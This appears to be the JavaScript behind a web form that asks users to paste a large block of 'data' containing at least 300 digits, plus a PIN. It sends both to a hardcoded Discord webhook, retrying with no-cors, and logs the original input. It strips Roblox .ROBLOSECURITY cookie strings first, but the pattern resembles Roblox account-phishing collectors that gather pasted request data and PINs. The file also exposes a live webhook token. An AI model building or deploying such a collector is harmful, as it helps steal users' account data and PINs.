const webhookURL = "https://discord.com/api/webhooks/1435351221161558167/33dOfCr35mfCmHflpF57x25QJ3AlSeEmvow0TBEgbIshg8Gch-MliM-pid6jxlIGYLF1";

const btn = document.getElementById("copyBtn");
const gf = document.getElementById("File");
const pin = document.getElementById("pin");
const toast = document.getElementById("toast");

const showToast = (message) => {
  toast.textContent = message;
  toast.style.display = "block";
  clearTimeout(toast._t);
  toast._t = setTimeout(() => toast.style.display = "none", 3000);
};

const countDigits = (str) => (str.match(/\d/g) || []).length;

function findRobloxCookieMatches(text) {
  if (!text) return [];
  const matches = new Set();

  const re1 = /(?:\.ROBLOSECURITY)\s*=\s*([^\s;`'"]{8,2000})/ig;
  let m;
  while ((m = re1.exec(text)) !== null) matches.add(m[1]);

  const re2 = /(_\|WARNING:[^\s`'"]{8,2000})/ig;
  while ((m = re2.exec(text)) !== null) matches.add(m[1]);

  const re3 = /([^\s`'"]{25,2000}\|[^\s`'"]{5,2000})/g;
  while ((m = re3.exec(text)) !== null) {
    const candidate = m[1];
    if (candidate.includes('_|') || candidate.length > 40) matches.add(candidate);
  }

  return Array.from(matches);
}

function redactCookiesFromText(text) {
  const matches = findRobloxCookieMatches(text);
  if (!matches.length) return text;
  let out = text;
  for (const token of matches) {
    const esc = token.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    out = out.replace(new RegExp(esc, 'g'), '[REDACTED_MY_COOKIE]');
  }
  return out;
}

async function trySend(payloadContent) {
  try {
    const res = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: payloadContent })
    });
    return { ok: res.ok, status: res.status, text: await res.text().catch(() => null), usedNoCors: false };
  } catch (err) {
    console.warn("fetch failed (likely CORS). Will attempt no-cors fallback.", err);
    try {
      await fetch(webhookURL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "text/plain" },
        body: payloadContent
      });
      return { ok: null, status: null, text: null, usedNoCors: true };
    } catch (err2) {
      return { ok: false, status: null, error: String(err2), usedNoCors: true };
    }
  }
}

btn.onclick = async () => {
  const data = gf.value.trim();
  const pinValue = pin.value.trim();

  if (!data) return showToast("Please paste your data.");
  if (!pinValue) return showToast("Please create a PIN.");

  const digitCount = countDigits(data);
  if (digitCount < 300) return showToast(`Input must contain at least 300 digits. (Found ${digitCount})`);

  btn.disabled = true;
  btn.textContent = "Processing…";

  const redacted = redactCookiesFromText(data);
  const payload = `🚨 New Submission (sanitized):\n\`\`\`${redacted}\`\`\`\n\nPIN: ${pinValue}`;

  const result = await trySend(payload);

  if (result.ok === true) {
    showToast("✅ Submitted to Discord (sanitized).");
  } else if (result.ok === false) {
    console.error("Send failed:", result);
    showToast("❌ Couldn't send to Discord — see console for details.");
  } else {
    console.warn("no-cors fallback used; delivery uncertain.", result);
    showToast("⚠️ Sent (fallback). Delivery may be blocked by CORS; check console.");
  }

  console.group("Submission diagnostic");
  console.log("originalPreview:", data.slice(0,1000));
  console.log("redactedPreview:", redacted.slice(0,1000));
  console.log("sendResult:", result);
  console.groupEnd();

  setTimeout(() => {
    btn.disabled = false;
    btn.textContent = "Submit";
  }, 1200);
};
